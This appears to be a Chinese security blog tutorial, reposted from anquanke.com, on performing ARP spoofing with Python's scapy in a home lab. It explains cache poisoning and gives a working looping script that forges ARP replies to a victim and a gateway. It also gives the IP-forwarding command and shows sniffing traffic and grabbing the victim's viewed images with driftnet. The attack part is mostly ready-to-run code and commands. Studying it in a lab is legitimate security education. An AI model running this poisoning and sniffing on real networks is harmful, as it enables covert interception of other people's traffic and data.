> 原文链接: https://www.anquanke.com//post/id/151337 


# 使用scapy进行ARP攻击


                                阅读量   
                                **178540**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01c450ca946da4aa4a.jpg)](https://p3.ssl.qhimg.com/t01c450ca946da4aa4a.jpg)

ARP协议并不只在发送了ARP请求才接收ARP应答。当计算机接收到ARP应答数据包的时候，就会对本地的ARP缓存进行更新，将应答中的IP和MAC地址存储在ARP缓存中。因此，当局域网中的某台机器B向A发送一个自己伪造的ARP应答，而如果这个应答是B冒充C伪造来的，即IP地址为C的IP，而MAC地址是伪造的，则当A接收到B伪造的ARP应答后，就会更新本地的ARP缓存，这样在A看来C的IP地址没有变，而它的MAC地址已经不是原来那个了。<br>
通过ARP欺骗可以对内网数据进行嗅探，在内网渗透中往往也是重要的一部分。



## 实验环境如下

无线网关：<br>
IP:192.168.199.1<br>
MAC: d4-ee-07-67-40-68<br>
普通用户：<br>
IP：192.168.199.213<br>
MAC：5c:93:a2:fe:29:e3<br>
攻击者：<br>
IP：192.168.199.229<br>
MAC：30-b4-9e-67-25-47<br>
实验环境图如下：[![](https://p5.ssl.qhimg.com/t01e8588375120acef5.png)](https://p5.ssl.qhimg.com/t01e8588375120acef5.png)



## 一、ARP 欺骗原理

攻击者通过构造两种ARP响应包，分别欺骗普通用户和网关路由器。<br>
第一种ARP包中源IP为网关IP(192.168.199.1)，源MAC为攻击者MAC(30:b4:9e:67:25:47)，目的IP为普通用户IP(192.168.199.213)，目的MAC为普通用户MAC(5c:93:a2:fe:29:e3)。当用户收到此ARP报文则将ARP表中网关的MAC地址更新为攻击者的MAC(30:b4:9e:67:25:47)。当普通转发数据时数据则会发向攻击者的PC上，由攻击者进行数据转发。<br>
第二种ARP包中源IP为普通用户IP(192.168.199.213)，但源MAC为攻击者MAC(30:b4:9e:67:25:47)，目的IP为网关IP(192.168.199.1)，目的MAC为网关MAC(d4:ee:07:67:40:68)。网关收到此ARP将ARP表中普通用户的MAC更新为攻击者MAC(30:b4:9e:67:25:47)。<br>
实现代码如下：<br>
`def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):

```
poison_target=ARP()
poison_target.op=2
poison_target.psrc=gateway_ip
poison_target.pdst=target_ip
poison_target.hwdst=target_mac
poison_gateway=ARP()
poison_gateway.op=2
poison_gateway.psrc=target_ip
poison_gateway.pdst=gateway_ip
poison_gateway.hwdst=gateway_mac
print "[*] Beginning the ARP poison.[CTRL-C to stop]"
while True:
    try:
        send(poison_target)
        send(poison_gateway)
        print "send sucess!"
        time.sleep(2)
    except KeyboardInterrupt:
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
print "[*] ARP poison attack finished."
return
```

通过不间断的发送这两种ARP报文，攻击者以中间人的形式窃取数据报文。

实验前普通用户PC机中ARP表如下：<br>[![](https://p1.ssl.qhimg.com/t014886088349fd1182.png)](https://p1.ssl.qhimg.com/t014886088349fd1182.png)<br>
实验开始前，需打开攻击者的路由转发功能，若未开启转发攻击，普通用户则无法正常访问外网。<br>`echo 1 &gt; /proc/sys/net/ipv4/ip_forward`<br>
运行脚本:<br>[![](https://p4.ssl.qhimg.com/t016e5570bc8aa4f82d.png)](https://p4.ssl.qhimg.com/t016e5570bc8aa4f82d.png)<br>
查看普通用户的ARP表项：<br>[![](https://p4.ssl.qhimg.com/t014201baa29f04bcb1.png)](https://p4.ssl.qhimg.com/t014201baa29f04bcb1.png)



## 二、进行数据包抓取

使用scapy抓包代码如下：<br>[![](https://p4.ssl.qhimg.com/t015b0f90663f886554.png)](https://p4.ssl.qhimg.com/t015b0f90663f886554.png)<br>
成功进行了ARP欺骗，访问外网，能正常访问<br>[![](https://p5.ssl.qhimg.com/t01bcd9bb44188a1b5c.png)](https://p5.ssl.qhimg.com/t01bcd9bb44188a1b5c.png)<br>
在攻击者PC上抓取的数据包，并用wireshark打开如下：<br>[![](https://p4.ssl.qhimg.com/t01168593e03b5e8ecd.png)](https://p4.ssl.qhimg.com/t01168593e03b5e8ecd.png)



## 三、图片浏览

当被攻击用户同浏览器访问图片文件时，可搭配driftnet进行图片抓取<br>`driftnet -i wlan0`<br>
抓取图片如下：[![](https://p3.ssl.qhimg.com/t0149ddade02768261e.png)](https://p3.ssl.qhimg.com/t0149ddade02768261e.png)<br>
参考文章：《Black Hat Python》

代码托管：[https://github.com/fishyyh/arppoison.git](https://github.com/fishyyh/arppoison.git)

审核人：yiwang   编辑：边边
